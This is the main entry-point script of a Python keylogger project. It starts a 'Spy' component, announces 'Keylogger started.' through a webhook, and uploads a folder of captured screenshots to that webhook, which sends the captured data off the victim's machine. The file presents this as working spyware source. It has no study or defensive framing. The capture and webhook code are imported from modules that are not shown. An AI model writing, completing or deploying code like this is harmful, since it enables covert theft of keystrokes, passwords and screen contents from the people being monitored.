import os
import signal

from core.spy import Spy
from core.webhook import send_message, send_data

def signal_handler(sig, frame):
    print("Exiting...")
    os._exit(0)


signal.signal(signal.SIGINT, signal_handler)

def main():
    send_message("Keylogger started.")
    send_data("/Users/mohamedkhettab/Desktop/Coding/Python/keylogger-v2/src/logs/screenshots")
    spy = Spy()
    try:
        spy.start()
        signal.pause()
    except Exception as e:
        spy.handle_error(e)
    finally:
        print("Spy stopped.")

    return 0


if __name__ == "__main__":
    main()
